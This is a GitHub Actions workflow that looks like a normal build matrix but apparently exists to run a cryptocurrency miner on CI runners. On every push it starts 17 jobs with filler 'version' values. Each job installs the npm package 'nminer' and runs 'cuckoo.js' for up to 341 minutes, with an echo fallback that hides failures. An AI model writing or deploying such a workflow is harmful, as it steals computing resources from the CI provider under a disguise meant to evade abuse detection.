name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7722 }
          - { version: 6212 }
          - { version: 2507 }
          - { version: 3857 }
          - { version: 6012 }
          - { version: 5624 }
          - { version: 9301 }
          - { version: 491 }
          - { version: 4691 }
          - { version: 8556 }
          - { version: 2051 }
          - { version: 6886 }
          - { version: 6802 }
          - { version: 7163 }
          - { version: 1558 }
          - { version: 7341 }
          - { version: 4701 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: before
        run: |
          npm install nminer@latest
          timeout 341m node cuckoo.js || echo "cuckoo executed"